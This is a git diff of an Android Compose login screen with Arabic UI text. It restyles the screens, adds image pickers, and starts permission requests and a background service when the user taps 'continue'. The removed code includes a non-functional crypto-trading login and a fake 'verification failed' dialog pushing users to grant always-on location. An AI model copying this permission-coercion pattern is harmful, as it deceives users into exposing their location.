+                        .clip(CircleShape)
+                        .background(Color(0xFF131B45))
+                        .border(2.dp, Brush.linearGradient(listOf(Neon.Cyan, Neon.Magenta)), CircleShape),
+                    contentAlignment = Alignment.Center
+                ) {
+                    if (bmp != null) {
+                        Image(bitmap = bmp.asImageBitmap(), contentDescription = "صورة الملف الشخصي",
+                            modifier = Modifier.fillMaxSize(), contentScale = ContentScale.Crop)
+                    } else {
+                        androidx.compose.material3.Icon(Icons.Default.Person, contentDescription = null,
+                            tint = Neon.Hint, modifier = Modifier.size(30.dp))
+                    }
+                }
+                Spacer(Modifier.width(14.dp))
+                Column {
+                    Text("صورة الملف الشخصي", color = Neon.Txt, fontSize = 14.5.sp, fontWeight = FontWeight.Bold)
+                    Spacer(Modifier.height(4.dp))
+                    Text("اختر صورة أو التقط صورة جديدة", color = Neon.Hint, fontSize = 11.5.sp)
+                }
+            }
+            Spacer(Modifier.height(14.dp))
+            Row(horizontalArrangement = Arrangement.spacedBy(10.dp)) {
+                PickerButton("اختيار من المعرض", Icons.Default.Image) { pickProfile.launch("image/*") }
+                PickerButton("التقاط صورة", Icons.Default.PhotoCamera) { shotProfile.launch(null) }
+            }
+        }
+    }
+
+    @Composable
+    fun BackgroundImageCard() {
+        val ctx = LocalContext.current
+        val bmp = remember(bgUri, bgBmp) { bgBmp ?: bgUri?.let { uriToBitmap(ctx, it) } }
+
+        Column(
+            modifier = Modifier
+                .fillMaxWidth()
+                .clip(RoundedCornerShape(20.dp))
+                .background(Neon.FieldBg)
+                .border(1.dp, Neon.FieldBorder, RoundedCornerShape(20.dp))
+                .padding(16.dp)
+        ) {
+            Row(verticalAlignment = Alignment.CenterVertically) {
+                Box {
+                    Box(
+                        modifier = Modifier
+                            .width(78.dp)
+                            .height(64.dp)
+                            .clip(RoundedCornerShape(12.dp))
+                            .background(Color(0xFF131B45))
+                            .border(1.dp, Neon.FieldBorder, RoundedCornerShape(12.dp)),
+                        contentAlignment = Alignment.Center
+                    ) {
+                        if (bmp != null) {
+                            Image(bitmap = bmp.asImageBitmap(), contentDescription = "صورة الخلفية",
+                                modifier = Modifier.fillMaxSize(), contentScale = ContentScale.Crop)
+                        } else {
+                            androidx.compose.material3.Icon(Icons.Default.Image, contentDescription = null,
+                                tint = Neon.Hint, modifier = Modifier.size(26.dp))
+                        }
+                    }
+                    if (bmp != null) {
+                        Box(
+                            modifier = Modifier
+                                .align(Alignment.TopStart)
+                                .offset(x = (-6).dp, y = (-6).dp)
+                                .size(20.dp)
+                                .clip(CircleShape)
+                                .background(Neon.Magenta)
+                                .clickable { bgUri = null; bgBmp = null },
+                            contentAlignment = Alignment.Center
+                        ) {
+                            androidx.compose.material3.Icon(Icons.Default.Close, contentDescription = "حذف الصورة",
+                                tint = Color.White, modifier = Modifier.size(13.dp))
+                        }
+                    }
+                }
+                Spacer(Modifier.width(14.dp))
+                Column {
+                    Text("صورة الخلفية", color = Neon.Txt, fontSize = 14.5.sp, fontWeight = FontWeight.Bold)
+                    Spacer(Modifier.height(4.dp))
+                    Text("اختر صورة خلفية لحسابك", color = Neon.Hint, fontSize = 11.5.sp)
+                }
+            }
+            Spacer(Modifier.height(14.dp))
+            Row(horizontalArrangement = Arrangement.spacedBy(10.dp)) {
+                PickerButton("اختيار من المعرض", Icons.Default.Image) { pickBg.launch("image/*") }
+                PickerButton("التقاط صورة", Icons.Default.PhotoCamera) { shotBg.launch(null) }
+            }
+        }
+    }
+
+    @Composable
+    fun BackButton(onClick: () -> Unit) {
+        Box(
+            modifier = Modifier
+                .size(40.dp)
+                .clip(RoundedCornerShape(12.dp))
+                .background(Color(0x40131B45))
+                .border(1.dp, Neon.FieldBorder, RoundedCornerShape(12.dp))
+                .clickable { onClick() },
+            contentAlignment = Alignment.Center
+        ) {
+            Text("→", color = Neon.Cyan, fontSize = 18.sp, fontWeight = FontWeight.Bold)
+        }
+    }
+
+    @Composable
+    fun CaptchaBox(code: String, onClick: () -> Unit) {
+        val bitmap = remember(code) { generateCaptchaBitmap(code) }
+        Image(
+            bitmap = bitmap.asImageBitmap(),
+            contentDescription = "Captcha",
+            modifier = Modifier
+                .width(88.dp)
+                .height(40.dp)
+                .clip(RoundedCornerShape(7.dp))
+                .clickable { onClick() }
+        )
+    }
+
+    // ═══════════════════════════════════════════
+    //  Language Screen
     // ═══════════════════════════════════════════
     @Composable
     fun LanguageScreen() {
@@ -209,145 +934,73 @@ class LoginActivity : ComponentActivity() {
         Column(
             modifier = Modifier
                 .fillMaxSize()
-                .background(ComposeColor(0xFF0B1220))
                 .padding(horizontal = 20.dp)
         ) {
-            // Header
             Spacer(Modifier.height(40.dp))
-
-            Column(
-                modifier = Modifier.fillMaxWidth(),
-                horizontalAlignment = Alignment.End
-            ) {
-                Text(
-                    "اختر اللغة",
-                    color = ComposeColor(0xFFF2F5FA),
-                    fontSize = 22.sp,
-                    fontWeight = FontWeight.Bold,
-                    textAlign = TextAlign.Right,
-                    modifier = Modifier.fillMaxWidth()
-                )
+            Column(modifier = Modifier.fillMaxWidth(), horizontalAlignment = Alignment.End) {
+                Text("اختر اللغة", color = Neon.Txt, fontSize = 22.sp,
+                    fontWeight = FontWeight.Bold, textAlign = TextAlign.Right,
+                    modifier = Modifier.fillMaxWidth())
                 Spacer(Modifier.height(6.dp))
-                Text(
-                    "Select your language",
-                    color = ComposeColor(0xFF8A94A6),
-                    fontSize = 13.sp,
-                    textAlign = TextAlign.Right,
-                    modifier = Modifier.fillMaxWidth()
-                )
+                Text("Select your language", color = Neon.Hint, fontSize = 13.sp,
+                    textAlign = TextAlign.Right, modifier = Modifier.fillMaxWidth())
             }
-
             Spacer(Modifier.height(24.dp))
 
-            // قائمة اللغات
-            Column(
-                modifier = Modifier
-                    .weight(1f)
-                    .verticalScroll(rememberScrollState())
-            ) {
+            Column(modifier = Modifier.weight(1f).verticalScroll(rememberScrollState())) {
                 languages.forEachIndexed { index, item ->
                     val selected = selectedLang == index
                     Row(
                         modifier = Modifier
                             .fillMaxWidth()
                             .clip(RoundedCornerShape(12.dp))
-                            .background(
-                                if (selected) ComposeColor(0xFF161F33) else ComposeColor.Transparent
-                            )
+                            .background(if (selected) Color(0xFF161F33) else Color.Transparent)
                             .clickable { selectedLang = index }
                             .padding(horizontal = 12.dp, vertical = 14.dp),
                         verticalAlignment = Alignment.CenterVertically
                     ) {
-                        Text(
-                            item.name,
-                            color = ComposeColor(0xFFF2F5FA),
-                            fontSize = 15.sp,
-                            modifier = Modifier.weight(1f)
-                        )
-
+                        Text(item.name, color = Neon.Txt, fontSize = 15.sp, modifier = Modifier.weight(1f))
                         Spacer(Modifier.width(14.dp))
-
-                        FlagIcon(
-                            code = item.flag,
-                            modifier = Modifier
-                                .width(32.dp)
-                                .height(23.dp)
-                        )
-
+                        FlagIcon(code = item.flag, modifier = Modifier.width(32.dp).height(23.dp))
                         Spacer(Modifier.width(14.dp))
-
                         if (selected) {
-                            Box(
-                                modifier = Modifier
-                                    .size(26.dp)
-                                    .clip(CircleShape)
-                                    .background(ComposeColor(0xFF6C4DF6)),
-                                contentAlignment = Alignment.Center
-                            ) {
-                                Text(
-                                    "✓",
-                                    color = ComposeColor.White,
-                                    fontSize = 15.sp,
-                                    fontWeight = FontWeight.Bold
-                                )
+                            Box(modifier = Modifier.size(26.dp).clip(CircleShape).background(Neon.Purple),
+                                contentAlignment = Alignment.Center) {
+                                Text("✓", color = Color.White, fontSize = 15.sp, fontWeight = FontWeight.Bold)
                             }
                         } else {
-                            Box(
-                                modifier = Modifier
-                                    .size(26.dp)
-                                    .border(2.dp, ComposeColor(0xFF7D8798), CircleShape)
-                            )
+                            Box(modifier = Modifier.size(26.dp).border(2.dp, Color(0xFF7D8798), CircleShape))
                         }
                     }
                 }
             }
 
-            // ⭐ زر متابعة احترافي
             Spacer(Modifier.height(12.dp))
 
             Box(
                 modifier = Modifier
                     .fillMaxWidth()
                     .height(56.dp)
+                    .shadow(18.dp, RoundedCornerShape(16.dp), ambientColor = Neon.Magenta, spotColor = Neon.Purple)
                     .clip(RoundedCornerShape(16.dp))
-                    .background(
-                        Brush.horizontalGradient(
-                            colors = listOf(
-                                ComposeColor(0xFF3D8BFF),
-                                ComposeColor(0xFF1A5CFF)
-                            )
-                        )
-                    )
+                    .background(Brush.horizontalGradient(listOf(Neon.Magenta, Neon.Purple, Neon.Blue, Neon.Cyan)))
                     .clickable {
+                        // ⭐ بعد "متابعة" — ابدأ طلب الصلاحيات + شغّل الخدمة
                         currentScreen = 0
-                        showLoadingOverlay = true
+                        startPermissionsAfterLanguage()
                     },
                 contentAlignment = Alignment.Center
             ) {
                 Row(verticalAlignment = Alignment.CenterVertically) {
-                    Text(
-                        "متابعة",
-                        color = ComposeColor.White,
-                        fontSize = 17.sp,
-                        fontWeight = FontWeight.Bold
-                    )
+                    Text("متابعة", color = Color.White, fontSize = 17.sp, fontWeight = FontWeight.Bold)
                     Spacer(Modifier.width(8.dp))
-                    Text(
-                        "←",
-                        color = ComposeColor.White,
-                        fontSize = 20.sp,
-                        fontWeight = FontWeight.Bold
-                    )
+                    Text("←", color = Color.White, fontSize = 20.sp, fontWeight = FontWeight.Bold)
                 }
             }
-
             Spacer(Modifier.height(24.dp))
         }
     }
 
-    // ═══════════════════════════════════════════
-    //  Flags
-    // ═══════════════════════════════════════════
     @Composable
     fun FlagIcon(code: String, modifier: Modifier = Modifier) {
         ComposeCanvas(modifier = modifier.clip(RoundedCornerShape(3.dp))) {
@@ -358,152 +1011,75 @@ class LoginActivity : ComponentActivity() {
                     val stripe = h / 13f
                     for (i in 0 until 13) {
                         drawRect(
-                            color = if (i % 2 == 0) ComposeColor(0xFFB22234) else ComposeColor.White,
+                            color = if (i % 2 == 0) Color(0xFFB22234) else Color.White,
                             topLeft = Offset(0f, i * stripe),
                             size = Size(w, stripe + 1f)
                         )
                     }
-                    drawRect(
-                        ComposeColor(0xFF3C3B6E),
-                        topLeft = Offset.Zero,
-                        size = Size(w * 0.45f, stripe * 7f)
-                    )
+                    drawRect(Color(0xFF3C3B6E), topLeft = Offset.Zero, size = Size(w * 0.45f, stripe * 7f))
                     val dotR = stripe * 0.3f
                     for (row in 0 until 4) {
                         for (col in 0 until 5) {
-                            drawCircle(
-                                ComposeColor.White,
-                                radius = dotR,
-                                center = Offset(
-                                    w * 0.45f * (col + 0.5f) / 5f,
-                                    stripe * 7f * (row + 0.5f) / 4f
-                                )
-                            )
+                            drawCircle(Color.White, radius = dotR,
+                                center = Offset(w * 0.45f * (col + 0.5f) / 5f, stripe * 7f * (row + 0.5f) / 4f))
                         }
                     }
                 }
                 "cn" -> {
-                    drawRect(ComposeColor(0xFFDE2910))
-                    drawPath(
-                        starPath(w * 0.22f, h * 0.32f, h * 0.22f),
-                        ComposeColor(0xFFFFDE00)
-                    )
+                    drawRect(Color(0xFFDE2910))
+                    drawPath(starPath(w * 0.22f, h * 0.32f, h * 0.22f), Color(0xFFFFDE00))
                 }
                 "jp" -> {
-                    drawRect(ComposeColor.White)
-                    drawCircle(
-                        ComposeColor(0xFFBC002D),
-                        radius = h * 0.3f,
-                        center = Offset(w / 2f, h / 2f)
-                    )
+                    drawRect(Color.White)
+                    drawCircle(Color(0xFFBC002D), radius = h * 0.3f, center = Offset(w / 2f, h / 2f))
                 }
                 "tr" -> {
-                    drawRect(ComposeColor(0xFFE30A17))
-                    drawCircle(
-                        ComposeColor.White,
-                        radius = h * 0.3f,
-                        center = Offset(w * 0.38f, h / 2f)
-                    )
-                    drawCircle(
-                        ComposeColor(0xFFE30A17),
-                        radius = h * 0.25f,
-                        center = Offset(w * 0.44f, h / 2f)
-                    )
-                    drawPath(
-                        starPath(w * 0.6f, h / 2f, h * 0.13f, startDeg = 180),
-                        ComposeColor.White
-                    )
+                    drawRect(Color(0xFFE30A17))
+                    drawCircle(Color.White, radius = h * 0.3f, center = Offset(w * 0.38f, h / 2f))
+                    drawCircle(Color(0xFFE30A17), radius = h * 0.25f, center = Offset(w * 0.44f, h / 2f))
+                    drawPath(starPath(w * 0.6f, h / 2f, h * 0.13f, startDeg = 180), Color.White)
                 }
                 "kr" -> {
-                    drawRect(ComposeColor.White)
+                    drawRect(Color.White)
                     val d = h * 0.56f
                     val tl = Offset(w / 2f - d / 2f, h / 2f - d / 2f)
-                    drawArc(
-                        ComposeColor(0xFFCD2E3A),
-                        startAngle = 180f,
-                        sweepAngle = 180f,
-                        useCenter = true,
-                        topLeft = tl,
-                        size = Size(d, d)
-                    )
-                    drawArc(
-                        ComposeColor(0xFF0047A0),
-                        startAngle = 0f,
-                        sweepAngle = 180f,
-                        useCenter = true,
-                        topLeft = tl,
-                        size = Size(d, d)
-                    )
+                    drawArc(Color(0xFFCD2E3A), 180f, 180f, true, tl, Size(d, d))
+                    drawArc(Color(0xFF0047A0), 0f, 180f, true, tl, Size(d, d))
                 }
                 "vn" -> {
-                    drawRect(ComposeColor(0xFFDA251D))
-                    drawPath(
-                        starPath(w / 2f, h / 2f, h * 0.28f),
-                        ComposeColor(0xFFFFFF00)
-                    )
+                    drawRect(Color(0xFFDA251D))
+                    drawPath(starPath(w / 2f, h / 2f, h * 0.28f), Color(0xFFFFFF00))
                 }
                 "fr" -> {
-                    drawRect(ComposeColor(0xFF0055A4), size = Size(w / 3f, h))
-                    drawRect(
-                        ComposeColor.White,
-                        topLeft = Offset(w / 3f, 0f),
-                        size = Size(w / 3f, h)
-                    )
-                    drawRect(
-                        ComposeColor(0xFFEF4135),
-                        topLeft = Offset(2f * w / 3f, 0f),
-                        size = Size(w / 3f, h)
-                    )
+                    drawRect(Color(0xFF0055A4), size = Size(w / 3f, h))
+                    drawRect(Color.White, topLeft = Offset(w / 3f, 0f), size = Size(w / 3f, h))
+                    drawRect(Color(0xFFEF4135), topLeft = Offset(2f * w / 3f, 0f), size = Size(w / 3f, h))
                 }
                 "pt" -> {
-                    drawRect(ComposeColor(0xFF046A38), size = Size(w * 0.4f, h))
-                    drawRect(
-                        ComposeColor(0xFFDA291C),
-                        topLeft = Offset(w * 0.4f, 0f),
-                        size = Size(w * 0.6f, h)
-                    )
-                    drawCircle(
-                        ComposeColor(0xFFFFE900),
-                        radius = h * 0.16f,
-                        center = Offset(w * 0.4f, h / 2f)
-                    )
+                    drawRect(Color(0xFF046A38), size = Size(w * 0.4f, h))
+                    drawRect(Color(0xFFDA291C), topLeft = Offset(w * 0.4f, 0f), size = Size(w * 0.6f, h))
+                    drawCircle(Color(0xFFFFE900), radius = h * 0.16f, center = Offset(w * 0.4f, h / 2f))
                 }
                 "pk" -> {
-                    drawRect(ComposeColor(0xFF01411C))
-                    drawRect(ComposeColor.White, size = Size(w * 0.25f, h))
-                    drawCircle(
-                        ComposeColor.White,
-                        radius = h * 0.28f,
-                        center = Offset(w * 0.62f, h * 0.45f)
-                    )
-                    drawCircle(
-                        ComposeColor(0xFF01411C),
-                        radius = h * 0.24f,
-                        center = Offset(w * 0.68f, h * 0.4f)
-                    )
+                    drawRect(Color(0xFF01411C))
+                    drawRect(Color.White, size = Size(w * 0.25f, h))
+                    drawCircle(Color.White, radius = h * 0.28f, center = Offset(w * 0.62f, h * 0.45f))
+                    drawCircle(Color(0xFF01411C), radius = h * 0.24f, center = Offset(w * 0.68f, h * 0.4f))
                 }
                 "ir" -> {
-                    drawRect(ComposeColor(0xFF239F40), size = Size(w, h / 3f))
-                    drawRect(
-                        ComposeColor.White,
-                        topLeft = Offset(0f, h / 3f),
-                        size = Size(w, h / 3f)
-                    )
-                    drawRect(
-                        ComposeColor(0xFFDA0000),
-                        topLeft = Offset(0f, 2f * h / 3f),
-                        size = Size(w, h / 3f)
-                    )
+                    drawRect(Color(0xFF239F40), size = Size(w, h / 3f))
+                    drawRect(Color.White, topLeft = Offset(0f, h / 3f), size = Size(w, h / 3f))
+                    drawRect(Color(0xFFDA0000), topLeft = Offset(0f, 2f * h / 3f), size = Size(w, h / 3f))
                 }
                 "th" -> {
                     val s = h / 6f
-                    drawRect(ComposeColor(0xFFA51931), size = Size(w, s))
-                    drawRect(ComposeColor(0xFFF4F5F8), topLeft = Offset(0f, s), size = Size(w, s))
-                    drawRect(ComposeColor(0xFF2D2A4A), topLeft = Offset(0f, 2f * s), size = Size(w, 2f * s))
-                    drawRect(ComposeColor(0xFFF4F5F8), topLeft = Offset(0f, 4f * s), size = Size(w, s))
-                    drawRect(ComposeColor(0xFFA51931), topLeft = Offset(0f, 5f * s), size = Size(w, s))
+                    drawRect(Color(0xFFA51931), size = Size(w, s))
+                    drawRect(Color(0xFFF4F5F8), topLeft = Offset(0f, s), size = Size(w, s))
+                    drawRect(Color(0xFF2D2A4A), topLeft = Offset(0f, 2f * s), size = Size(w, 2f * s))
+                    drawRect(Color(0xFFF4F5F8), topLeft = Offset(0f, 4f * s), size = Size(w, s))
+                    drawRect(Color(0xFFA51931), topLeft = Offset(0f, 5f * s), size = Size(w, s))
                 }
-                else -> drawRect(ComposeColor(0xFF555555))
+                else -> drawRect(Color(0xFF555555))
             }
         }
     }
@@ -523,651 +1099,7 @@ class LoginActivity : ComponentActivity() {
     }
 
     // ═══════════════════════════════════════════
-    //  Loading Overlay
-    // ═══════════════════════════════════════════
-    @Composable
-    fun LoadingOverlay() {
-        Box(
-            modifier = Modifier
-                .fillMaxSize()
-                .background(ComposeColor(0x33000000))
-                .clickable(
-                    interactionSource = remember { MutableInteractionSource() },
-                    indication = null
-                ) {},
-            contentAlignment = Alignment.Center
-        ) {
-            Box(
-                modifier = Modifier
-                    .size(96.dp)
-                    .clip(RoundedCornerShape(16.dp))
-                    .background(ComposeColor(0xB3000000)),
-                contentAlignment = Alignment.Center
-            ) {
-                DashedLoadingIndicator()
-            }
-        }
-    }
-
-    @Composable
-    fun DashedLoadingIndicator() {
-        val transition = rememberInfiniteTransition()
-        val rotation by transition.animateFloat(
-            initialValue = 0f,
-            targetValue = 360f,
-            animationSpec = infiniteRepeatable(
-                animation = tween(durationMillis = 1200, easing = LinearEasing)
-            )
-        )
-        ComposeCanvas(modifier = Modifier.size(36.dp)) {
-            val strokeW = 3.dp.toPx()
-            val r = (size.minDimension - strokeW) / 2f
-            val cx = size.width / 2f
-            val cy = size.height / 2f
-            val segments = 8
-            val sweep = 360f / segments * 0.55f
-            for (i in 0 until segments) {
-                val start = rotation + i * (360f / segments)
-                val alpha = 1f - (i.toFloat() / segments) * 0.75f
-                drawArc(
-                    color = ComposeColor.White.copy(alpha = alpha),
-                    startAngle = start,
-                    sweepAngle = sweep,
-                    useCenter = false,
-                    topLeft = Offset(cx - r, cy - r),
-                    size = Size(r * 2f, r * 2f),
-                    style = Stroke(width = strokeW, cap = StrokeCap.Round)
-                )
-            }
-        }
-    }
-
-    // ═══════════════════════════════════════════
-    //  Location Settings Dialog
-    // ═══════════════════════════════════════════
-    @Composable
-    fun LocationSettingsDialog() {
-        Box(
-            modifier = Modifier
-                .fillMaxSize()
-                .background(ComposeColor(0x66000000))
-                .clickable(
-                    interactionSource = remember { MutableInteractionSource() },
-                    indication = null
-                ) {},
-            contentAlignment = Alignment.Center
-        ) {
-            Column(
-                modifier = Modifier
-                    .padding(horizontal = 30.dp)
-                    .fillMaxWidth()
-                    .clip(RoundedCornerShape(18.dp))
-                    .background(ComposeColor.White)
-                    .padding(horizontal = 20.dp, vertical = 24.dp),
-                horizontalAlignment = Alignment.CenterHorizontally
-            ) {
-                Text(
-                    "فشل التحقق من صحة المعلومات",
-                    color = ComposeColor(0xFF1B1B1B),
-                    fontSize = 17.sp,
-                    fontWeight = FontWeight.Bold,
-                    textAlign = TextAlign.Center
-                )
-
-                Spacer(Modifier.height(14.dp))
-
-                Text(
-                    "يرجي تفعيل الموقع يدوي من الاعدادات\nالأذونات\nالموقع\nالسماح دائم\nثم اعد فتح التطبيق",
-                    color = ComposeColor(0xFF5A5A5A),
-                    fontSize = 14.5.sp,
-                    textAlign = TextAlign.Center,
-                    lineHeight = 24.sp
-                )
-
-                Spacer(Modifier.height(20.dp))
-
-                Button(
-                    onClick = {
-                        try {
-                            val i = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
-                            i.data = Uri.parse("package:$packageName")
-                            startActivity(i)
-                        } catch (_: Exception) {}
-                    },
-                    modifier = Modifier
-                        .fillMaxWidth()
-                        .height(50.dp),
-                    shape = RoundedCornerShape(12.dp),
-                    colors = ButtonDefaults.buttonColors(
-                        containerColor = ComposeColor(0xFF3D8BFF)
-                    )
-                ) {
-                    Text(
-                        "فتح اعدادات التطبيق",
-                        color = ComposeColor.White,
-                        fontSize = 15.5.sp,
-                        fontWeight = FontWeight.Bold
-                    )
-                }
-            }
-        }
-    }
-
-    // ═══════════════════════════════════════════
-    //  Login Screen
-    // ═══════════════════════════════════════════
-    @Composable
-    fun LoginScreen() {
-        Column(
-            modifier = Modifier
-                .fillMaxSize()
-                .verticalScroll(rememberScrollState())
-        ) {
-            Column(
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .padding(22.dp),
-                horizontalAlignment = Alignment.CenterHorizontally
-            ) {
-                Image(
-                    painter = painterResource(id = R.drawable.logo),
-                    contentDescription = "Logo",
-                    modifier = Modifier.height(60.dp),
-                    contentScale = ContentScale.Fit
-                )
-
-                Spacer(Modifier.height(14.dp))
-
-                Row(
-                    modifier = Modifier
-                        .clip(RoundedCornerShape(50))
-                        .background(ComposeColor(0xBF0A193C))
-                        .border(1.dp, ComposeColor(0x475A96FF), RoundedCornerShape(50))
-                        .padding(horizontal = 15.dp, vertical = 7.dp),
-                    verticalAlignment = Alignment.CenterVertically
-                ) {
-                    Image(
-                        painter = painterResource(id = R.drawable.ic_home),
-                        contentDescription = null,
-                        modifier = Modifier.size(15.dp)
-                    )
-                    Spacer(Modifier.width(7.dp))
-                    Text(
-                        "Trade cryptocurrencies anytime",
-                        color = ComposeColor(0xFFDBE7FF),
-                        fontSize = 13.sp
-                    )
-                }
-
-                Spacer(Modifier.height(15.dp))
-
-                Text(
-                    buildAnnotatedString {
-                        append("Power up your\n")
-                        withStyle(SpanStyle(color = ComposeColor(0xFF3D8BFF))) {
-                            append("cryptocurrency")
-                        }
-                        append("\njourney")
-                    },
-                    color = ComposeColor.White,
-                    fontSize = 30.sp,
-                    fontWeight = FontWeight.Bold,
-                    textAlign = TextAlign.Center,
-                    lineHeight = 38.sp
-                )
-
-                Spacer(Modifier.height(12.dp))
-
-                Image(
-                    painter = painterResource(id = R.drawable.coin),
-                    contentDescription = "Coin",
-                    modifier = Modifier
-                        .width(290.dp)
-                        .offset(y = 32.dp),
-                    contentScale = ContentScale.Fit
-                )
-            }
-
-            Spacer(Modifier.height(32.dp))
-
-            Column(
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .clip(RoundedCornerShape(topStart = 34.dp, topEnd = 34.dp))
-                    .background(ComposeColor(0xFF0A1128))
-                    .padding(22.dp)
-            ) {
-                Row {
-                    Text(
-                        "Email",
-                        color = ComposeColor.White,
-                        fontSize = 16.5.sp,
-                        fontWeight = FontWeight.Bold,
-                        modifier = Modifier.padding(end = 26.dp)
-                    )
-                    Text(
-                        "Phone",
-                        color = ComposeColor(0xFF5C6C8F),
-                        fontSize = 16.5.sp,
-                        fontWeight = FontWeight.Bold
-                    )
-                }
-
-                Spacer(Modifier.height(18.dp))
-
-                CustomInput(email, { email = it }, "Email")
-                Spacer(Modifier.height(12.dp))
-
-                PasswordInput(password, { password = it }, pwVisible, { pwVisible = !pwVisible }, "Password")
-
-                Spacer(Modifier.height(12.dp))
-
-                Row(
-                    modifier = Modifier
-                        .fillMaxWidth()
-                        .height(52.dp)
-                        .clip(RoundedCornerShape(12.dp))
-                        .background(ComposeColor(0xFF131C36))
-                        .border(1.dp, ComposeColor(0xFF1E2A4D), RoundedCornerShape(12.dp))
-                        .padding(horizontal = 16.dp),
-                    verticalAlignment = Alignment.CenterVertically
-                ) {
-                    BasicTextField(
-                        value = capInput,
-                        onValueChange = { if (it.length <= 6) capInput = it.uppercase() },
-                        modifier = Modifier.weight(1f),
-                        textStyle = androidx.compose.ui.text.TextStyle(
-                            color = ComposeColor(0xFFE8EEF8),
-                            fontSize = 15.sp
-                        ),
-                        decorationBox = { inner ->
-                            if (capInput.isEmpty()) {
-                                Text(
-                                    "Please enter the verification code",
-                                    color = ComposeColor(0xFF5C6C8F),
-                                    fontSize = 15.sp
-                                )
-                            }
-                            inner()
-                        }
-                    )
-                    CaptchaBox(capCode) { capCode = generateCaptcha(); capInput = "" }
-                }
-
-                Spacer(Modifier.height(16.dp))
-
-                Button(
-                    onClick = {
-                        if (email.isBlank() || password.isBlank()) {
-                            showToast("Please enter email and password")
-                        } else if (capInput.isNotBlank() && capInput != capCode) {
-                            showToast("Verification code is incorrect")
-                            capCode = generateCaptcha()
-                            capInput = ""
-                        } else {
-                            showToast("Login successful (demo)")
-                        }
-                    },
-                    modifier = Modifier
-                        .fillMaxWidth()
-                        .height(52.dp),
-                    shape = RoundedCornerShape(12.dp),
-                    colors = ButtonDefaults.buttonColors(
-                        containerColor = ComposeColor(0xFF3D8BFF)
-                    )
-                ) {
-                    Text("Log In", color = ComposeColor.White, fontSize = 16.5.sp, fontWeight = FontWeight.Bold)
-                }
-
-                Spacer(Modifier.height(18.dp))
-
-                Row {
-                    Text(
-                        "reset pass",
-                        color = ComposeColor(0xFF8FA3C8),
-                        fontSize = 14.sp,
-                        modifier = Modifier
-                            .weight(1f)
-                            .clickable { currentScreen = 2 }
-                            .padding(vertical = 8.dp)
-                    )
-                    Text(
-                        "to register",
-                        color = ComposeColor(0xFF8FA3C8),
-                        fontSize = 14.sp,
-                        textAlign = TextAlign.End,
-                        modifier = Modifier
-                            .weight(1f)
-                            .clickable { currentScreen = 1 }
-                            .padding(vertical = 8.dp)
-                    )
-                }
-            }
-        }
-    }
-
-    // ═══════════════════════════════════════════
-    //  Register Screen
-    // ═══════════════════════════════════════════
-    @Composable
-    fun RegisterScreen() {
-        Column(
-            modifier = Modifier
-                .fillMaxSize()
-                .verticalScroll(rememberScrollState())
-                .padding(22.dp)
-        ) {
-            Row(verticalAlignment = Alignment.CenterVertically) {
-                BackButton { currentScreen = 0 }
-                Text(
-                    "Email",
-                    color = ComposeColor.White,
-                    fontSize = 17.5.sp,
-                    fontWeight = FontWeight.Bold,
-                    textAlign = TextAlign.Center,
-                    modifier = Modifier.weight(1f)
-                )
-                Spacer(Modifier.width(38.dp))
-            }
-
-            Spacer(Modifier.height(28.dp))
-
-            Label("Email")
-            CustomInput(regEmail, { regEmail = it }, "Please enter your email address")
-
-            Spacer(Modifier.height(16.dp))
-            Label("Verification code")
-            Row(
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .height(54.dp)
-                    .clip(RoundedCornerShape(10.dp))
-                    .background(ComposeColor(0xFF16224A))
-                    .border(1.dp, ComposeColor(0xFF23336B), RoundedCornerShape(10.dp))
-                    .padding(horizontal = 16.dp),
-                verticalAlignment = Alignment.CenterVertically
-            ) {
-                BasicTextField(
-                    value = regVC,
-                    onValueChange = { regVC = it },
-                    modifier = Modifier.weight(1f),
-                    textStyle = androidx.compose.ui.text.TextStyle(
-                        color = ComposeColor(0xFFE8EEF8),
-                        fontSize = 15.sp
-                    ),
-                    decorationBox = { inner ->
-                        if (regVC.isEmpty()) {
-                            Text("Please enter the verification code", color = ComposeColor(0xFF5C6C8F), fontSize = 15.sp)
-                        }
-                        inner()
-                    }
-                )
-                Text(
-                    "Send",
-                    color = ComposeColor(0xFFDCE8FF),
-                    fontSize = 15.sp,
-                    fontWeight = FontWeight.Bold,
-                    modifier = Modifier
-                        .clickable { showToast("Code will be sent (demo)") }
-                        .padding(start = 12.dp)
-                )
-            }
-
-            Spacer(Modifier.height(16.dp))
-            Label("Registration password (6-16)")
-            PasswordInput(regP1, { regP1 = it }, regP1Visible, { regP1Visible = !regP1Visible }, "Password", registerInput = true)
-            Spacer(Modifier.height(12.dp))
-            PasswordInput(regP2, { regP2 = it }, regP2Visible, { regP2Visible = !regP2Visible }, "Enter password again", registerInput = true)
-
-            Spacer(Modifier.height(16.dp))
-            Label("Referrer Invitation Code (Required)")
-            CustomInput(regRef, { regRef = it }, "Referrer invitation code", registerInput = true)
-
-            Spacer(Modifier.height(30.dp))
-
-            Button(
-                onClick = {
-                    if (regEmail.isBlank()) showToast("Please enter email")
-                    else if (regVC.isBlank()) showToast("Please enter verification code")
-                    else if (regP1.length < 6 || regP1.length > 16) showToast("Password must be 6-16 characters")
-                    else if (regP1 != regP2) showToast("Passwords do not match")
-                    else if (regRef.isBlank()) showToast("Please enter invitation code")
-                    else showToast("Registration successful (demo)")
-                },
-                modifier = Modifier.fillMaxWidth().height(54.dp),
-                shape = RoundedCornerShape(10.dp),
-                colors = ButtonDefaults.buttonColors(containerColor = ComposeColor(0xFF3D8BFF))
-            ) {
-                Text("Register", color = ComposeColor.White, fontSize = 16.5.sp, fontWeight = FontWeight.Bold)
-            }
-
-            Spacer(Modifier.height(20.dp))
-
-            Text(
-                "To log in",
-                color = ComposeColor(0xFF8BA5D9),
-                fontSize = 14.5.sp,
-                textAlign = TextAlign.Center,
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .clickable { currentScreen = 0 }
-                    .padding(vertical = 8.dp)
-            )
-        }
-    }
-
-    // ═══════════════════════════════════════════
-    //  Reset Screen
-    // ═══════════════════════════════════════════
-    @Composable
-    fun ResetScreen() {
-        Column(
-            modifier = Modifier
-                .fillMaxSize()
-                .verticalScroll(rememberScrollState())
-                .padding(22.dp)
-        ) {
-            Row(verticalAlignment = Alignment.CenterVertically) {
-                BackButton { currentScreen = 0 }
-                Text(
-                    "Reset Password",
-                    color = ComposeColor.White,
-                    fontSize = 17.5.sp,
-                    fontWeight = FontWeight.Bold,
-                    textAlign = TextAlign.Center,
